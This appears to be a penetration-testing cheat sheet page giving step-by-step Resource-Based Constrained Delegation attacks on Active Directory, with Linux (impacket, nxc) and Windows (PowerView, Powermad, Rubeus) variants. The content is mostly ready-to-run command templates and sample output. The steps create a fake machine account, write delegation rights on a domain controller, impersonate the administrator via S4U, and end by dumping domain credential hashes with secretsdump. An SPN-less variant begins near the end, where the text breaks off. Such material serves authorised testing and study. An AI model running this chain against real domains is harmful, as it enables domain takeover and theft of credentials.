---
title: "RBCD Attack"
tags: ["Active Directory", "RBCD Attack", "Credential Dumping", "Genericall", "Impersonate", "Pass-The-Hash", "Pass-The-Ticket", "RBCD", "Resource-Based Constrained Delegation", "S4U", "SPN-less", "Silver Ticket", "Ticket Granting Ticket", "Windows", "WriteAccountRestrictions"]
---

{{< filter_buttons >}}

### RBCD Attack

{{< tab set1 tab1 >}}Linux{{< /tab >}}
{{< tab set1 tab2 >}}Windows{{< /tab >}}
{{< tabcontent set1 tab1 >}}

#### 1. Check Machine Quota \[Optional\]

```console {class="password"}
# Password
nxc ldap <TARGET> -u '<USER>' -p '<PASSWORD>' -d <DOMAIN> -M maq
```

```console {class="sample-code"}
$ nxc ldap DC01.example.com -u 'apple.seed' -p 'Password123!' -d example.com -M maq
LDAP        10.10.72.181    389    DC01          [*] Windows Server 2022 Build 20348 (name:DC01) (domain:example.com)
LDAP        10.10.72.181    389    DC01          [+] example.com\apple.seed:Password123! 
MAQ         10.10.72.181    389    DC01          [*] Getting the MachineAccountQuota
MAQ         10.10.72.181    389    DC01          MachineAccountQuota: 10
```

```console {class="ntlm"}
# NTLM
nxc ldap <TARGET> -u '<USER>' -H '<HASH>' -d <DOMAIN> -M maq
```

```console {class="sample-code"}
$ nxc ldap dc01.example.com -u 'apple.seed' -H '2B576ACBE6BCFDA7294D6BD18041B8FE' -d giveback.htb -M maq
LDAP        10.10.72.181    389    DC01          [*] Windows Server 2022 Build 20348 (name:DC01) (domain:example.com)
LDAP        10.10.72.181    389    DC01          [+] example.com\apple.seed:2B576ACBE6BCFDA7294D6BD18041B8FE
MAQ         10.10.72.181    389    DC01          [*] Getting the MachineAccountQuota
MAQ         10.10.72.181    389    DC01          MachineAccountQuota: 10
```

```console {class="password-based-kerberos"}
# Password-based Kerberos
nxc ldap <TARGET> -u '<USER>' -p '<PASSWORD>' -d <DOMAIN> -k --kdcHost <DC> -M maq
```

```console {class="sample-code"}
$ nxc ldap dc01.example.com -u 'apple.seed' -p 'Password123!' -d giveback.htb -k --kdcHost dc01.example.com -M maq
LDAP        10.10.72.181    389    DC01          [*] Windows Server 2022 Build 20348 (name:DC01) (domain:example.com)
LDAP        10.10.72.181    389    DC01          [+] example.com\apple.seed:Password123! 
MAQ         10.10.72.181    389    DC01          [*] Getting the MachineAccountQuota
MAQ         10.10.72.181    389    DC01          MachineAccountQuota: 10
```

```console {class="ntlm-based-kerberos"}
# NTLM-based Kerberos
nxc ldap <TARGET> -u '<USER>' -H '<HASH>' -d <DOMAIN> -k --kdcHost <DC> -M maq
```

```console {class="sample-code"}
$ nxc ldap dc01.example.com -u 'apple.seed' -H '2B576ACBE6BCFDA7294D6BD18041B8FE' -d giveback.htb -k --kdcHost dc01.example.com -M maq
LDAP        10.10.72.181    389    DC01          [*] Windows Server 2022 Build 20348 (name:DC01) (domain:example.com)
LDAP        10.10.72.181    389    DC01          [+] example.com\apple.seed:2B576ACBE6BCFDA7294D6BD18041B8FE
MAQ         10.10.72.181    389    DC01          [*] Getting the MachineAccountQuota
MAQ         10.10.72.181    389    DC01          MachineAccountQuota: 10
```

```console {class="ticket-based-kerberos"}
# Ticket-based Kerberos
nxc ldap <TARGET> -u '<USER>' -d <DOMAIN> -k --use-kcache --kdcHost <DC> -M maq
```

```console {class="sample-code"}
$ nxc ldap dc01.example.com -u 'apple.seed' -d giveback.htb -k --use-kcache --kdcHost dc01.example.com -M maq
LDAP        10.10.72.181    389    DC01          [*] Windows Server 2022 Build 20348 (name:DC01) (domain:example.com)
MAQ         10.10.72.181    389    DC01          [*] Getting the MachineAccountQuota
MAQ         10.10.72.181    389    DC01          MachineAccountQuota: 10
```

#### 2. Create a Fake Computer \[Optional\]

```console {class="password"}
# Password
impacket-addcomputer '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC_IP> -computer-name '<COMPUTER>' -computer-pass '<COMPUTER_PASSWORD>'
```

```console {class="sample-code"}
$ impacket-addcomputer 'example.com/apple.seed:Password123!' -computer-name 'EvilComputer' -computer-pass 'Password123!' -dc-ip 10.10.11.10
Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra

[*] Successfully added machine account EvilComputer$ with password Password123!.
```

```console {class="ntlm"}
# NTLM
impacket-addcomputer '<DOMAIN>/<USER>' -hashes :<HASH> -dc-ip <DC_IP> -computer-name '<COMPUTER>' -computer-pass '<COMPUTER_PASSWORD>'
```

```console {class="sample-code"}
$ impacket-addcomputer 'example.com/apple.seed' -hashes :2B576ACBE6BCFDA7294D6BD18041B8FE -computer-name 'EvilComputer' -computer-pass 'Password123!' -dc-ip 10.10.11.10
Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra

[*] Successfully added machine account EvilComputer$ with password Password123!.
```

```console {class="password-based-kerberos"}
# Password-based Kerberos
impacket-addcomputer '<DOMAIN>/<USER>:<PASSWORD>' -k -dc-ip <DC_IP> -computer-name '<COMPUTER>' -computer-pass '<COMPUTER_PASSWORD>'
```

```console {class="sample-code"}
$ impacket-addcomputer 'example.com/apple.seed:Password123!' -k -computer-name 'EvilComputer' -computer-pass 'Password123!' -dc-ip 10.10.11.10
Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra

[*] Successfully added machine account EvilComputer$ with password Password123!.
```

```console {class="ntlm-based-kerberos"}
# NTLM-based Kerberos
impacket-addcomputer '<DOMAIN>/<USER>' -hashes :<HASH> -k -dc-ip <DC_IP> -computer-name '<COMPUTER>' -computer-pass '<COMPUTER_PASSWORD>'
```

```console {class="sample-code"}
$ impacket-addcomputer 'example.com/apple.seed' -hashes :2B576ACBE6BCFDA7294D6BD18041B8FE -k -computer-name 'EvilComputer' -computer-pass 'Password123!' -dc-ip 10.10.11.10
Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra

[*] Successfully added machine account EvilComputer$ with password Password123!.
```

```console {class="ticket-based-kerberos"}
# Ticket-based Kerberos
impacket-addcomputer '<DOMAIN>/<USER>' -k -dc-ip <DC_IP> -computer-name '<COMPUTER>' -computer-pass '<COMPUTER_PASSWORD>'
```

```console {class="sample-code"}
$ impacket-addcomputer 'example.com/apple.seed' -k -computer-name 'EvilComputer' -computer-pass 'Password123!' -dc-ip 10.10.11.10
Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra

[*] Successfully added machine account EvilComputer$ with password Password123!.
```

#### 3. Get Service Principle Name (SPN) \[Optional\]

```console {class="password"}
# Password
impacket-GetUserSPNs '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC_IP> -request
```

```console {class="sample-code"}
$ impacket-GetUserSPNs 'example.com/svc_web:Password123!' -dc-ip 10.10.11.10 -request                                 
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName      Name             MemberOf  PasswordLastSet             LastLogon                   Delegation 
------------------------  ---------------  --------  --------------------------  --------------------------  ----------   
MSSQL/ms01.example.com  svc_web            2023-06-07 17:48:26.340517  2025-08-06 08:14:20.426867
```

```console {class="ntlm"}
# NTLM
impacket-GetUserSPNs '<DOMAIN>/<USER>' -hashes :<HASH> -dc-ip <DC_IP> -request
```

```console {class="sample-code"}
$ impacket-GetUserSPNs 'example.com/svc_web' -hashes :2B576ACBE6BCFDA7294D6BD18041B8FE -dc-ip 10.10.11.10 -request
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName      Name             MemberOf  PasswordLastSet             LastLogon                   Delegation 
------------------------  ---------------  --------  --------------------------  --------------------------  ----------   
MSSQL/ms01.example.com  svc_web            2023-06-07 17:48:26.340517  2025-08-06 08:14:20.426867
```

```console {class="password-based-kerberos"}
# Password-based Kerberos
impacket-GetUserSPNs '<DOMAIN>/<USER>:<PASSWORD>' -k -dc-ip <DC_IP> -request
```

```console {class="sample-code"}
$ impacket-GetUserSPNs 'example.com/svc_web:Password123!' -k -dc-ip 10.10.11.10 -request
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName      Name             MemberOf  PasswordLastSet             LastLogon                   Delegation 
------------------------  ---------------  --------  --------------------------  --------------------------  ----------   
MSSQL/ms01.example.com  svc_web            2023-06-07 17:48:26.340517  2025-08-06 08:14:20.426867
```

```console {class="ntlm-based-kerberos"}
# NTLM-based Kerberos
impacket-GetUserSPNs '<DOMAIN>/<USER>' -hashes :<HASH> -k -dc-ip <DC_IP> -request
```

```console {class="sample-code"}
$ impacket-GetUserSPNs 'example.com/svc_web' -hashes :2B576ACBE6BCFDA7294D6BD18041B8FE -k -dc-ip 10.10.11.10 -request
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName      Name             MemberOf  PasswordLastSet             LastLogon                   Delegation 
------------------------  ---------------  --------  --------------------------  --------------------------  ----------   
MSSQL/ms01.example.com  svc_web            2023-06-07 17:48:26.340517  2025-08-06 08:14:20.426867
```

```console {class="ticket-based-kerberos"}
# Ticket-based Kerberos
impacket-GetUserSPNs '<DOMAIN>/<USER>' -k -dc-ip <DC_IP> -request
```

```console {class="sample-code"}
$ impacket-GetUserSPNs 'example.com/svc_web' -k -dc-ip 10.10.11.10 -request
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName      Name             MemberOf  PasswordLastSet             LastLogon                   Delegation 
------------------------  ---------------  --------  --------------------------  --------------------------  ----------   
MSSQL/ms01.example.com  svc_web            2023-06-07 17:48:26.340517  2025-08-06 08:14:20.426867
```

#### 4. RBCD Attack \[Control over an Account with SPN\]

```console {class="password"}
# Password
impacket-rbcd '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC_IP> -delegate-from '<COMPUTER>$' -delegate-to '<TARGET_COMPUTER>$' -action 'write'
```

```console {class="sample-code"}
$ impacket-rbcd 'example.com/apple.seed:Password123!' -dc-ip 10.10.11.10 -delegate-from 'EvilComputer$' -delegate-to 'DC$' -action 'write'
Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra

[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
[*] Delegation rights modified successfully!
[*] EvilComputer$ can now impersonate users on DC$ via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
[*]     EvilComputer$   (S-1-5-21-3542429192-2036945976-3483670807-11601)
```

```console {class="ntlm"}
# NTLM
impacket-rbcd '<DOMAIN>/<USER>' -hashes :<HASH> -dc-ip <DC_IP> -delegate-from '<COMPUTER>$' -delegate-to '<TARGET_COMPUTER>$' -action 'write'
```

```console {class="sample-code"}
$ impacket-rbcd 'example.com/apple.seed' -hashes :2B576ACBE6BCFDA7294D6BD18041B8FE -dc-ip 10.10.11.10 -delegate-from 'EvilComputer$' -delegate-to 'DC$' -action 'write'
Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra

[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
[*] Delegation rights modified successfully!
[*] EvilComputer$ can now impersonate users on DC$ via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
[*]     EvilComputer$   (S-1-5-21-3542429192-2036945976-3483670807-11601)
```

```console {class="password-based-kerberos"}
# Password-based Kerberos
impacket-rbcd '<DOMAIN>/<USER>:<PASSWORD>' -k -dc-ip <DC_IP> -delegate-from '<COMPUTER>$' -delegate-to '<TARGET_COMPUTER>$' -action 'write'
```

```console {class="sample-code"}
$ impacket-rbcd 'example.com/apple.seed:Password123!' -k -dc-ip 10.10.11.10 -delegate-from 'EvilComputer$' -delegate-to 'DC$' -action 'write'
Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra

[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
[*] Delegation rights modified successfully!
[*] EvilComputer$ can now impersonate users on DC$ via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
[*]     EvilComputer$   (S-1-5-21-3542429192-2036945976-3483670807-11601)
```

```console {class="ntlm-based-kerberos"}
# NTLM-based Kerberos
impacket-rbcd '<DOMAIN>/<USER>' -hashes :<HASH> -k -dc-ip <DC_IP> -delegate-from '<COMPUTER>$' -delegate-to '<TARGET_COMPUTER>$' -action 'write'
```

```console {class="sample-code"}
$ impacket-rbcd 'example.com/apple.seed' -hashes :2B576ACBE6BCFDA7294D6BD18041B8FE -k -dc-ip 10.10.11.10 -delegate-from 'EvilComputer$' -delegate-to 'DC$' -action 'write'
Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra

[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
[*] Delegation rights modified successfully!
[*] EvilComputer$ can now impersonate users on DC$ via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
[*]     EvilComputer$   (S-1-5-21-3542429192-2036945976-3483670807-11601)
```

```console {class="ticket-based-kerberos"}
# Ticket-based Kerberos
impacket-rbcd '<DOMAIN>/<USER>' -k -dc-ip <DC_IP> -delegate-from '<COMPUTER>$' -delegate-to '<TARGET_COMPUTER>$' -action 'write'
```

```console {class="sample-code"}
$ impacket-rbcd 'example.com/apple.seed' -k -dc-ip 10.10.11.10 -delegate-from 'EvilComputer$' -delegate-to 'DC$' -action 'write'
Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra

[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
[*] Delegation rights modified successfully!
[*] EvilComputer$ can now impersonate users on DC$ via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
[*]     EvilComputer$   (S-1-5-21-3542429192-2036945976-3483670807-11601)
```

<small>*Note: Delegate from an account with SPN, which may not be a computer.*</small>
<br>
<small>*Note: Remove trailing $ if not a machine account.*</small>

#### 5. Impersonate

```console {class="password"}
# Password
sudo ntpdate -s <DC_IP> && impacket-getST '<DOMAIN>/<COMPUTER>:<COMPUTER_PASSWORD>' -dc-ip <DC_IP> -spn <SPN> -impersonate <TARGET_USER>
```

```console {class="sample-code"}
$ sudo ntpdate -s 10.10.11.10 && impacket-getST 'example.com/EvilComputer:Password123!' -dc-ip 10.10.11.10 -spn cifs/dc.example.com -impersonate administrator
Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in administrator@cifs_dc.example.com@EXAMPLE.COM.ccache
```

```console {class="ntlm"}
# NTLM
sudo ntpdate -s <DC_IP> && impacket-getST '<DOMAIN>/<COMPUTER>' -hashes :<HASH> -dc-ip <DC_IP> -spn <SPN> -impersonate <TARGET_USER>
```

```console {class="sample-code"}
$ sudo ntpdate -s 10.10.11.10 && impacket-getST 'example.com/EvilComputer' -hashes :2B576ACBE6BCFDA7294D6BD18041B8FE -dc-ip 10.10.11.10 -spn cifs/dc.example.com -impersonate administrator
Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in administrator@cifs_dc.example.com@EXAMPLE.COM.ccache
```

```console {class="password-based-kerberos"}
# Password-based Kerberos
sudo ntpdate -s <DC_IP> && impacket-getST '<DOMAIN>/<COMPUTER>:<COMPUTER_PASSWORD>' -k -dc-ip <DC_IP> -spn <SPN> -impersonate <TARGET_USER>
```

```console {class="sample-code"}
$ sudo ntpdate -s 10.10.11.10 && impacket-getST 'example.com/EvilComputer:Password123!' -k -dc-ip 10.10.11.10 -spn cifs/dc.example.com -impersonate administrator
Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in administrator@cifs_dc.example.com@EXAMPLE.COM.ccache
```

```console {class="ntlm-based-kerberos"}
# NTLM-based Kerberos
sudo ntpdate -s <DC_IP> && impacket-getST '<DOMAIN>/<COMPUTER>' -hashes :<HASH> -k -dc-ip <DC_IP> -spn <SPN> -impersonate <TARGET_USER>
```

```console {class="sample-code"}
$ sudo ntpdate -s 10.10.11.10 && impacket-getST 'example.com/EvilComputer' -hashes :2B576ACBE6BCFDA7294D6BD18041B8FE -k -dc-ip 10.10.11.10 -spn cifs/dc.example.com -impersonate administrator
Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in administrator@cifs_dc.example.com@EXAMPLE.COM.ccache
```

```console {class="ticket-based-kerberos"}
# Ticket-based Kerberos
sudo ntpdate -s <DC_IP> && impacket-getST '<DOMAIN>/<COMPUTER>' -k -dc-ip <DC_IP> -spn <SPN> -impersonate <TARGET_USER>
```

```console {class="sample-code"}
$ sudo ntpdate -s 10.10.11.10 && impacket-getST 'example.com/EvilComputer' -k -dc-ip 10.10.11.10 -spn cifs/dc.example.com -impersonate administrator
Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in administrator@cifs_dc.example.com@EXAMPLE.COM.ccache
```

#### 6. Secrets Dump

```console
# Pass-the-ticket
export KRB5CCNAME='<CCACHE>'
```

```console {class="sample-code"}
$ export KRB5CCNAME='administrator@cifs_dc.example.com@EXAMPLE.COM.ccache'
```

```console
# Ticket-based Kerberos
impacket-secretsdump <TARGET_USER>@<TARGET> -k -no-pass
```

```console {class="sample-code"}
$ impacket-secretsdump administrator@dc.example.com -k -no-pass -just-dc-user Administrator
Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:7ddf32e17a6ac5ce04a8ecbf782ca509:::
---[SNIP]---
[*] Cleaning up...
```

{{< /tabcontent >}}
{{< tabcontent set1 tab2 >}}

#### 1. Import Modules

```console
. .\PowerView.ps1
```

```console {class="sample-code"}
*Evil-WinRM* PS C:\Users\apple.seed\Documents> . .\PowerView.ps1
```

```console
. .\Powermad.ps1
```

```console {class="sample-code"}
*Evil-WinRM* PS C:\Users\apple.seed\Documents> . .\Powermad.ps1
```

<small>*Ref: [Powermad.ps1](https://raw.githubusercontent.com/Kevin-Robertson/Powermad/master/Powermad.ps1)*</small>

#### 2. Check Machine Account Quota

```console
Get-DomainObject -Identity 'DC=<EXAMPLE>,DC=<COM>' | select ms-ds-machineaccountquota
```

```console {class="sample-code"}
*Evil-WinRM* PS C:\Users\apple.seed\Documents> Get-DomainObject -Identity 'DC=EXAMPLE,DC=COM' | select ms-ds-machineaccountquota

ms-ds-machineaccountquota
-------------------------
                       10
```

#### 3. Create New Computer Account

```console
New-MachineAccount -MachineAccount <COMPUTER> -Password $(ConvertTo-SecureString '<COMPUTER_PASSWORD>' -AsPlainText -Force)
```

```console {class="sample-code"}
*Evil-WinRM* PS C:\Users\apple.seed\Documents> New-MachineAccount -MachineAccount EvilComputer -Password
$(ConvertTo-SecureString 'Password123!' -AsPlainText -Force)
[+] Machine account EvilComputer added
```

#### 4. RBCD Attack

```console
$fakesid = Get-DomainComputer <COMPUTER> | select -expand objectsid
```

```console {class="sample-code"}
*Evil-WinRM* PS C:\Users\apple.seed\Documents> $fakesid = Get-DomainComputer EvilComputer | select -expand objectsid
```

```console
$fakesid
```

```console {class="sample-code"}
*Evil-WinRM* PS C:\Users\apple.seed\Documents> $fakesid
S-1-5-21-3542429192-2036945976-3483670807-11601
```

```console
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($fakesid))"
```

```console {class="sample-code"}
*Evil-WinRM* PS C:\Users\apple.seed\Documents> $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($fakesid))"
```

```console
$SDBytes = New-Object byte[] ($SD.BinaryLength)
```

```console {class="sample-code"}
*Evil-WinRM* PS C:\Users\apple.seed\Documents> $SDBytes = New-Object byte[] ($SD.BinaryLength)
```

```console
$SD.GetBinaryForm($SDBytes, 0)
```

```console {class="sample-code"}
*Evil-WinRM* PS C:\Users\apple.seed\Documents> $SD.GetBinaryForm($SDBytes, 0)
```

```console
Get-DomainComputer <TARGET_COMPUTER> | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
```

```console {class="sample-code"}
*Evil-WinRM* PS C:\Users\apple.seed\Documents> Get-DomainComputer DC | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
```

#### 5. Check if SecurityIdentifier is Now fakesid 

```console
$RawBytes = Get-DomainComputer <TARGET_COMPUTER> -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allowedtoactonbehalfofotheridentity
```

```console {class="sample-code"}
*Evil-WinRM* PS C:\Users\apple.seed\Documents> $RawBytes = Get-DomainComputer DC -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allowedtoactonbehalfofotheridentity
```

```console
$Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes, 0
```

```console {class="sample-code"}
*Evil-WinRM* PS C:\Users\apple.seed\Documents> $Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes, 0
```

```console
$Descriptor.DiscretionaryAcl
```

```console {class="sample-code"}
*Evil-WinRM* PS C:\Users\apple.seed\Documents> $Descriptor.DiscretionaryAcl


BinaryLength       : 36
AceQualifier       : AccessAllowed
IsCallback         : False
OpaqueLength       : 0
AccessMask         : 983551
SecurityIdentifier : S-1-5-21-3542429192-2036945976-3483670807-11601
AceType            : AccessAllowed
AceFlags           : None
IsInherited        : False
InheritanceFlags   : None
PropagationFlags   : None
AuditFlags         : None
```

#### 6. Impersonate

```console
# Calculate NTLM
.\rubeus.exe hash /password:'<COMPUTER_PASSWORD>' /user:<COMPUTER> /domain:<DOMAIN>
```

```console {class="sample-code"}
*Evil-WinRM* PS C:\Users\apple.seed\Documents> .\rubeus.exe hash /password:'Password123!' /user:EvilComputer /domain:example.com

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0


[*] Action: Calculate Password Hash(es)

[*] Input password             : Password123!
[*] Input username             : EvilComputer
[*] Input domain               : example.com
[*] Salt                       : EXAMPLE.COMEvilComputer
[*]       rc4_hmac             : B9E0CFCEAF6D077970306A2FD88A7C0A
[*]       aes128_cts_hmac_sha1 : FE834E7490537D833B4FBB0C215BEDB3
[*]       aes256_cts_hmac_sha1 : D105000C879775D1727D9E56EF0CA48FD2996B9370165832BB1C5A265922B359
[*]       des_cbc_md5          : DAE66B133454FDB5
```

```console
# Impersonate
.\rubeus.exe s4u /user:'<COMPUTER>$' /rc4:<HASH> /impersonateuser:administrator /msdsspn:<SPN> /ptt /nowrap
```

```console {class="sample-code"}
*Evil-WinRM* PS C:\Users\apple.seed\Documents> .\rubeus.exe s4u /user:'EvilComputer$' /rc4:B9E0CFCEAF6D077970306A2FD88A7C0A /impersonateuser:administrator /msdsspn:cifs/dc.example.com /ptt /nowrap

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0

[*] Action: S4U

[*] Using rc4_hmac hash: B9E0CFCEAF6D077970306A2FD88A7C0A
[*] Building AS-REQ (w/ preauth) for: 'example.com\EvilComputer$'
[*] Using domain controller: ::1:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIFuDCCBb ---[SNIP]--- VyLmh0Yg==

[*] Action: S4U

[*] Building S4U2self request for: 'EvilComputer$@EXAMPLE.COM'
[*] Using domain controller: DC.example.com (::1)
[*] Sending S4U2self request to ::1:88
[+] S4U2self success!
[*] Got a TGS for 'administrator' to 'EvilComputer$@EXAMPLE.COM'
[*] base64(ticket.kirbi):

      doIGCjCCBg ---[SNIP]--- 1wdXRlciQ=

[*] Impersonating user 'administrator' to target SPN 'cifs/dc.example.com'
[*] Building S4U2proxy request for service: 'cifs/dc.example.com'
[*] Using domain controller: DC.example.com (::1)
[*] Sending S4U2proxy request to domain controller ::1:88
[+] S4U2proxy success!
[*] base64(ticket.kirbi) for SPN 'cifs/dc.example.com':

      doIGujCCBr ---[SNIP]--- VyLmh0Yg==
[+] Ticket successfully imported!
```

#### 7. Convert to ccache Format

```console
python3 rubeustoccache.py '<BASE64_TICKET>' <TARGET_USER>.kirbi <TARGET_USER>.ccache
```

```console {class="sample-code"}
$ python3 rubeustoccache.py 'doIGujCCBr ---[SNIP]--- VyLmh0Yg==' secrets.kirbi secrets.ccache
╦═╗┬ ┬┌┐ ┌─┐┬ ┬┌─┐  ┌┬┐┌─┐  ╔═╗┌─┐┌─┐┌─┐┬ ┬┌─┐
╠╦╝│ │├┴┐├┤ │ │└─┐   │ │ │  ║  │  ├─┤│  ├─┤├┤ 
╩╚═└─┘└─┘└─┘└─┘└─┘   ┴ └─┘  ╚═╝└─┘┴ ┴└─┘┴ ┴└─┘
              By Solomon Sklash
          github.com/SolomonSklash
   Inspired by Zer1t0's ticket_converter.py

[*] Writing decoded .kirbi file to secrets.kirbi
[*] Writing converted .ccache file to secrets.ccache
[*] All done! Don't forget to set your environment variable: export KRB5CCNAME=secrets.ccache
```

<small>*Ref: [RubeusToCcache](https://github.com/SolomonSklash/RubeusToCcache)*</small>

#### 8. Secrets Dump

```console
# Pass-the-ticket
export KRB5CCNAME=<TARGET_USER>.ccache
```

```console {class="sample-code"}
$ export KRB5CCNAME=secrets.ccache
```

```console
# Ticket-based Kerberos
impacket-secretsdump <TARGET_USER>@<TARGET> -k -no-pass
```

```console {class="sample-code"}
$ impacket-secretsdump administrator@dc.example.com -k -no-pass -just-dc-user Administrator
Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:7ddf32e17a6ac5ce04a8ecbf782ca509:::
---[SNIP]---
[*] Cleaning up...
```

{{< /tabcontent >}}

---

### SPN-Less RBCD Attack

{{< tab set2 tab1 >}}Linux{{< /tab >}}
{{< tabcontent set2 tab1 >}}

#### 1. RBCD

```console {class="password"}
# Password
impacket-rbcd '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC_IP> -delegate-from '<USER>' -delegate-to '<TARGET_COMPUTER>$' -action 'write'
```

```console {class="sample-code"}
$ impacket-rbcd 'example.com/apple.seed:Password123!' -dc-ip 10.10.11.10 -delegate-from 'apple.seed' -delegate-to 'DC$' -action 'write'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
[*] Delegation rights modified successfully!
[*] apple.seed can now impersonate users on DC$ via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
[*]     apple.seed        (S-1-5-21-4029599044-1972224926-2225194048-1126)
```

```console {class="ntlm"}
# NTLM
impacket-rbcd '<DOMAIN>/<USER>' -hashes :<HASH> -dc-ip <DC_IP> -delegate-from '<USER>' -delegate-to '<TARGET_COMPUTER>$' -action 'write'
```

```console {class="sample-code"}
$ impacket-rbcd 'example.com/apple.seed' -hashes :2B576ACBE6BCFDA7294D6BD18041B8FE -dc-ip 10.10.11.10 -delegate-from 'apple.seed' -delegate-to 'DC$' -action 'write'
Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra

[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
[*] Delegation rights modified successfully!
[*] apple.seed can now impersonate users on DC$ via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
[*]     apple.seed   (S-1-5-21-3542429192-2036945976-3483670807-11601)
```

```console {class="password-based-kerberos"}
# Password-based Kerberos
impacket-rbcd '<DOMAIN>/<USER>:<PASSWORD>' -k -dc-ip <DC_IP> -delegate-from '<USER>' -delegate-to '<TARGET_COMPUTER>$' -action 'write'
```

```console {class="sample-code"}
$ impacket-rbcd 'example.com/apple.seed:Password123!' -k -dc-ip 10.10.11.10 -delegate-from 'apple.seed' -delegate-to 'DC$' -action 'write'
Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra

[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
[*] Delegation rights modified successfully!
[*] apple.seed can now impersonate users on DC$ via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
[*]     apple.seed   (S-1-5-21-3542429192-2036945976-3483670807-11601)
```

```console {class="ntlm-based-kerberos"}
# NTLM-based Kerberos
impacket-rbcd '<DOMAIN>/<USER>' -hashes :<HASH> -k -dc-ip <DC_IP> -delegate-from '<USER>' -delegate-to '<TARGET_COMPUTER>$' -action 'write'
```

